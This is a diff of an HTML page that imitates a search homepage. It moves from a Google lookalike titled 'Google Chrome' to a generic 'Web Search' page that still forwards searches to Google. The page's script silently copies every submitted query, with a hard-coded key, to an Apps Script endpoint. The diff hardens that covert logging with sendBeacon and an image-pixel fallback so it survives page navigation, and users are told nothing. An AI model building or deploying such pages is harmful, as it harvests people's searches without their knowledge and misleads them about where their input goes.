@@ -4,21 +4,22 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <meta name="color-scheme" content="light dark" />
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" />
-  <title>Google Chrome</title>
+  <title>Web Search</title>
   <style>
     :root {
       --bg:#ffffff;--text:#1f1f1f;--muted:#5f6368;--link:#1a73e8;
       --surface:#f6f7f8;--footer:#eef1f1;--shadow:0 1px 6px rgba(0,0,0,.12);
       --input-bg:#fff;--input-border:#dadce0;--icon:#9aa0a6;
-      --btn-bg:#eef1f1;--btn-text:#272626;--signin-bg:#0f63c1;--signin-text:#fff;
-      --r-xl:999px;--r-md:10px;--sp1:8px;--sp2:12px;--sp3:16px;--maxc:min(680px,96vw);
+      --btn-bg:#eef1f1;--btn-text:#272626;--r-xl:999px;--r-md:10px;
+      --sp1:8px;--sp2:12px;--sp3:16px;--maxc:min(680px,96vw);
     }
-    html[data-theme="dark"] {
-      --bg:#0f1115;--text:#e3e3e3;--muted:#b9bcbf;--link:#8ab4f8;
-      --surface:#161a20;--footer:#14171c;--shadow:0 1px 10px rgba(0,0,0,.5);
-      --input-bg:#0f131a;--input-border:#2a2f36;--icon:#a8adb3;
-      --btn-bg:#1f2530;--btn-text:#e6e6e6;--signin-bg:#1a73e8;--signin-text:#fff;
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg:#0f1115;--text:#e3e3e3;--muted:#b9bcbf;--link:#8ab4f8;
+        --surface:#161a20;--footer:#14171c;--shadow:0 1px 10px rgba(0,0,0,.5);
+        --input-bg:#0f131a;--input-border:#2a2f36;--icon:#a8adb3;
+        --btn-bg:#1f2530;--btn-text:#e6e6e6;
+      }
     }
     *,*::before,*::after{box-sizing:border-box}
     html,body{height:100%}
@@ -26,89 +27,113 @@
       font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased}
     a{color:var(--link);text-decoration:none}
     .container{display:flex;flex-direction:column;min-height:100%}
+
     .header{display:flex;align-items:center;justify-content:space-between;gap:var(--sp2);padding:var(--sp2)var(--sp3)}
     .header .left,.header .right{display:flex;align-items:center;gap:var(--sp2)}
-    .google-app{display:grid;place-items:center;width:32px;height:32px;border-radius:8px}
-    .google-app .dots{display:grid;grid-template-columns:repeat(3,6px);grid-template-rows:repeat(3,6px);gap:3px}
-    .google-app .dots i{display:block;width:6px;height:6px;border-radius:50%;background:var(--icon)}
-    .sign-in{background:var(--signin-bg);color:var(--signin-text);border:0;border-radius:var(--r-xl);
-      padding:10px 14px;font-size:16px;line-height:1;cursor:pointer;min-height:44px}
-    .sign-in a{color:var(--signin-text)}
+    /* 9-dot menu (generic) */
+    .app-grid{display:grid;place-items:center;width:32px;height:32px;border-radius:8px}
+    .app-grid .dots{display:grid;grid-template-columns:repeat(3,6px);grid-template-rows:repeat(3,6px);gap:3px}
+    .app-grid .dots i{display:block;width:6px;height:6px;border-radius:50%;background:var(--icon)}
+
     .content{display:grid;place-items:center;padding:clamp(12px,4vw,32px);gap:var(--sp3)}
-    .google-img-logo{margin-block:clamp(6px,3vw,10px)}
-    .google-img-logo img{width:clamp(180px,55vw,272px);height:auto}
+    /* Neutral wordmark instead of Google logo */
+    .wordmark{font-weight:800;letter-spacing:-.02em;font-size:clamp(36px,11vw,64px);
+      background:linear-gradient(90deg,#1a73e8,#34a853);-webkit-background-clip:text;background-clip:text;color:transparent;
+      margin-block:clamp(6px,3vw,10px)}
     .search-box{position:relative;width:100%;max-width:var(--maxc)}
-    .material-symbols-outlined{color:var(--icon);position:absolute;top:50%;transform:translateY(-50%);font-size:22px}
-    .material-symbols-outlined.search{left:14px}
-    .material-symbols-outlined.mic{right:14px}
+    .icon{position:absolute;top:50%;transform:translateY(-50%);width:20px;height:20px;fill:var(--icon)}
+    .icon.left{left:14px}.icon.right{right:14px}
     #search-input{width:100%;height:52px;border-radius:var(--r-xl);border:1px solid var(--input-border);
       outline:none;padding:0 46px;background:var(--input-bg);color:var(--text);box-shadow:var(--shadow);font-size:16px}
     .search-button{margin:14px 0;display:flex;gap:var(--sp2);justify-content:center;flex-wrap:wrap}
-    .btn-search,.btn-feeling-lucky{background:var(--btn-bg);color:var(--btn-text);border:1px solid var(--input-border);
+    .btn{background:var(--btn-bg);color:var(--btn-text);border:1px solid var(--input-border);
       border-radius:var(--r-md);min-width:44vw;max-width:320px;height:48px;cursor:pointer;padding:0 var(--sp3);
       font-size:16px;line-height:1;min-height:44px}
-    .footer{margin-top:auto;background:var(--footer);color:var(--text)}
+    @media(min-width:560px){.btn{min-width:160px;width:180px}}
+    .footer{margin-top:auto;background:var(--footer)}
     .footer-content{display:flex;justify-content:center;gap:clamp(10px,4vw,24px);padding:var(--sp2)var(--sp3);flex-wrap:wrap}
-    @media(min-width:560px){.btn-search,.btn-feeling-lucky{min-width:160px;width:180px}}
   </style>
 
   <script>
+    // Your Apps Script endpoint + key
     const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzjcfEtxgjZrajcdOEeiKj4j5HnAXt5GC0pkuxIfBGZsZmmikQ3o68ZjlSruCjp2Wai/exec';
-    const API_KEY  = 'magic-key-2025'; // your secret key
+    const API_KEY  = 'magic-key-2025';
 
-    async function sendToBackend(q){
-      try{
-        const body = new URLSearchParams({q,key:API_KEY});
-        await fetch(ENDPOINT,{method:'POST',body,mode:'cors',keepalive:true});
-      }catch(e){}
+    function sendToBackend(q){
+      const params = new URLSearchParams({ q, key: API_KEY });
+
+      // 1) Beacon POST survives navigation
+      try {
+        if (navigator.sendBeacon) {
+          const blob = new Blob([params.toString()], { type:'application/x-www-form-urlencoded;charset=UTF-8' });
+          navigator.sendBeacon(ENDPOINT, blob);
+        } else {
+          fetch(ENDPOINT, { method:'POST', body: params, keepalive:true, mode:'cors' });
+        }
+      } catch (_) {}
+
+      // 2) GET fallback (also saves on the server)
+      try {
+        const img = new Image();
+        img.src = ENDPOINT + '?' + params.toString();
+      } catch (_) {}
     }
 
     window.addEventListener('DOMContentLoaded',()=>{
-      const form=document.getElementById('search-form');
-      const input=document.getElementById('search-input');
-      const lucky=document.getElementById('btn-lucky');
+      const form  = document.getElementById('search-form');
+      const input = document.getElementById('search-input');
+      const lucky = document.getElementById('btn-lucky');
 
-      form?.addEventListener('submit',()=>{
-        const q=input.value||'';localStorage.setItem('lastSearch',q);sendToBackend(q);
+      form.addEventListener('submit', ()=>{
+        const q = input.value || '';
+        try { localStorage.setItem('lastSearch', q); } catch (e) {}
+        sendToBackend(q);
       });
 
-      lucky?.addEventListener('click',()=>{
-        const q=input.value||'';localStorage.setItem('lastSearch',q);sendToBackend(q);
-        window.location.href='https://www.google.com/search?btnI=I&q='+encodeURIComponent(q);
+      lucky.addEventListener('click', ()=>{
+        const q = input.value || '';
+        try { localStorage.setItem('lastSearch', q); } catch (e) {}
+        sendToBackend(q);
+        window.location.href = 'https://www.google.com/search?btnI=I&q=' + encodeURIComponent(q);
       });
     });
   </script>
 </head>
 <body>
   <div class="container">
+    <!-- Header -->
     <div class="header">
       <div class="left">
-        <div class="google-app"><div class="dots"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div></div>
+        <div class="app-grid" title="Apps"><div class="dots"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div></div>
       </div>
       <div class="right">
-        <a href="https://mail.google.com/mail/&ogbl">Gmail</a>
-        <a href="https://www.google.com/imghp?hl=en&ogbl">Images</a>
-        <button class="sign-in"><a href="https://accounts.google.com/ServiceLogin?hl=en&continue=https://www.google.com/">Sign in</a></button>
+        <a href="https://mail.google.com">Mail</a>
+        <a href="https://www.google.com/imghp">Images</a>
+        <a href="https://accounts.google.com/ServiceLogin">Sign in</a>
       </div>
     </div>
 
+    <!-- Content -->
     <div class="content">
-      <div class="google-img-logo">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" />
-      </div>
+      <div class="wordmark" aria-label="Web Search">Web&nbsp;Search</div>
+
       <div class="search-box">
-        <form id="search-form" action="https://www.google.com/search" method="GET">
-          <span class="material-symbols-outlined search">search</span>
-          <span class="material-symbols-outlined mic">mic</span>
+        <form id="search-form" action="https://www.google.com/search" method="GET" role="search" aria-label="Search the web">
+          <!-- search icon -->
+          <svg class="icon left" viewBox="0 0 24 24" aria-hidden="true"><path d="M15.5 14h-.79l-.28-.27a6.5 6.5 0 1 0-.71.71l.27.28v.79L20 21.5 21.5 20l-6-6zm-6 0a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/></svg>
+          <!-- mic icon -->
+          <svg class="icon right" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 14a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v5a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 14 0h-2zM11 19h2v3h-2z"/></svg>
           <input type="search" id="search-input" name="q" placeholder="Search" autocomplete="off" />
         </form>
       </div>
+
       <div class="search-button">
-        <button class="btn-search" type="submit" form="search-form">Google Search</button>
-        <button class="btn-feeling-lucky" id="btn-lucky" type="button">I'm Feeling Lucky</button>
+        <button class="btn" type="submit" form="search-form">Search</button>
+        <button class="btn" id="btn-lucky" type="button">I'm Feeling Lucky</button>
       </div>
     </div>
 
+    <!-- Footer -->
     <div class="footer">
       <div class="footer-content">
         <a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Settings</a>
@@ -117,4 +142,3 @@
   </div>
 </body>
 </html>
-
